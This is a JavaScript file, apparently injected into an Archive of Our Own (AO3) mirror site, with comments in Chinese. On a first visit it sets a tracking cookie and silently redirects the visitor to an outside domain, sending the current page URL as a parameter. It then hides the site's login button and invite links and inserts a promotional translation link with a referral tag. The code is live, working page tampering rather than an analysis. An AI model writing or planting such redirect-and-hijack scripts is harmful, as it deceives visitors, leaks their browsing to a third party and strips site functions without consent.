// 代码来自Project Ao3rework
document.writeln("<!DOCTYPE html>");
document.writeln("<html lang='en'>");
document.writeln("<head>");
document.writeln("<meta charset='UTF-8'>");
document.writeln("<meta name='viewport' content='width=device-width, initial-scale=1.0'>");
document.writeln("<title>Redirect Example</title>");
document.writeln("<script>");
document.writeln("window.onload = function() {");
document.writeln("    // 检查是否已经设置了 cookie");
document.writeln("    var visited = getCookie('visited');");
document.writeln("    // 如果 cookie 不存在，则设置 cookie 并重定向");
document.writeln("    if (!visited) {");
document.writeln("        // 获取当前日期");
document.writeln("        var currentDate = new Date();");
document.writeln("        // 将日期增加15天");
document.writeln("        var expiresDate = new Date(currentDate.getTime() + (15*24 * 60 * 60 * 1000)); // 加上15天的毫秒数");
document.writeln("        // 格式化日期字符串，设置 cookie 的过期时间");
document.writeln("        var expiresDateString = expiresDate.toUTCString();");
document.writeln("        // 设置 cookie，有效期为 15 天");
document.writeln("        document.cookie = 'visited=true; expires=' + expiresDateString;");
document.writeln("        // 获取当前页面的 URL");
document.writeln("        var currentPage = window.location.href;");
document.writeln("        // 构建重定向 URL，附加当前页面的 URL 作为参数");
document.writeln("        var redirectUrl = 'https://nav.hyf9588.tech?previousPage=' + encodeURIComponent(currentPage);");
document.writeln("        // 重定向到目标页面");
document.writeln("        window.location.href = redirectUrl;");
document.writeln("    }");
document.writeln("}");
document.writeln("");
document.writeln("// 获取指定名称的 cookie 值");
document.writeln("function getCookie(name) {");
document.writeln("    var nameEQ = name + '=';");
document.writeln("    var cookies = document.cookie.split(';');");
document.writeln("    for(var i = 0; i < cookies.length; i++) {");
document.writeln("        var cookie = cookies[i];");
document.writeln("        while (cookie.charAt(0) == ' ') cookie = cookie.substring(1, cookie.length);");
document.writeln("        if (cookie.indexOf(nameEQ) == 0) return cookie.substring(nameEQ.length, cookie.length);");
document.writeln("    }");
document.writeln("    return null;");
document.writeln("}");
document.writeln("</script>");
document.writeln("</head>");
document.writeln("<body>");
document.writeln("<!-- 这是您的页面内容 -->");
document.writeln("<h1></h1>");
document.writeln("<p></p>");
document.writeln("</body>");
document.writeln("</html>");
setTimeout(function() {
}, 2000);



var timeoutId;
timeoutId = setInterval(function () {
    var eeee = false;
    try {
        console.log(1111111111111);
        var div = document.createElement("div");
        document.body.appendChild(div);

        // 屏蔽登录按钮
        var loginBtn = document.getElementById("login-dropdown");
        if (loginBtn) {
            loginBtn.style.display = "none";
        }

        // 屏蔽邀请按钮
        var inviteLinks = document.querySelectorAll(".actions a[href='/invite_requests']");
        inviteLinks.forEach(function(link) {
            link.style.display = "none";
        });

        // 添加翻译链接
        var searchNav = document.getElementsByClassName("primary navigation actions")[0].getElementsByClassName("search")[0];
        if (searchNav) {
            searchNav.innerHTML = "<a href=\"https:\/\/fanyi.caiyunapp.com\/ao3?utm_source=fangao3sg.andbru123.cc.ua\" class=\"dropdown-toggle\"  data-target=\"#\">AO3翻译神器(一键翻译)</a>" + searchNav.innerHTML;
        }

        eeee = true;
    } catch (e) {
        console.log(e);
        eeee = false;
    }
    if(eeee){
        clearInterval(timeoutId);
    }
}, 100);
